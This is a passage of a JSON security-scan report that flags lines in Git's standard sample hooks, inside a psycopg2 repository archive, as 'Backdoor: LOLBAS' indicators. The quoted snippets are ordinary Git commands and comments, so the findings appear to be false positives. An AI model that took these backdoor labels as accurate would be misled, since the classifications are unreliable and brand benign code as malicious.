                      "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                      "markdown": "`\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 159,
                  "endLine": 159,
                  "endColumn": 5,
                  "snippet": {
                    "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                    "rendered": {
                      "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                      "markdown": "`To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 158,
                  "endLine": 158,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                    "rendered": {
                      "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                      "markdown": "`\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 12,
                  "endLine": 125,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                    "rendered": {
                      "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                      "markdown": "`\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 42,
                  "endLine": 102,
                  "endColumn": 47,
                  "snippet": {
                    "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                    "rendered": {
                      "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                      "markdown": "`   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 30,
                  "endLine": 40,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                      "markdown": "`# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 9,
                  "snippet": {
                    "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                    "rendered": {
                      "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                      "markdown": "`esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 48,
                  "endLine": 26,
                  "snippet": {
                    "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                    "rendered": {
                      "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                      "markdown": "`\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 18,
                  "endLine": 21,
                  "endColumn": 23,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 8,
                  "endLine": 21,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 1,
                  "endLine": 21,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1,
                  "endLine": 16,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                    "rendered": {
                      "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                      "markdown": "`# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 34,
                  "endLine": 15,
                  "endColumn": 39,
                  "snippet": {
                    "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                    "rendered": {
                      "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                      "markdown": "`# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 15,
                  "endLine": 77,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10,
                  "endLine": 7,
                  "endColumn": 18,
                  "snippet": {
                    "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                    "rendered": {
                      "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                      "markdown": "`#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 27,
                  "endLine": 3,
                  "endColumn": 35,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 4,
                  "endLine": 75,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 4,
                  "endLine": 70,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                    "rendered": {
                      "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                      "markdown": "`\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 18,
                  "endLine": 63,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 2,
                  "endLine": 63,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 4,
                  "endLine": 55,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                      "markdown": "`\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 4,
                  "endLine": 50,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                    "rendered": {
                      "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                      "markdown": "`# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 39,
                  "endLine": 37,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
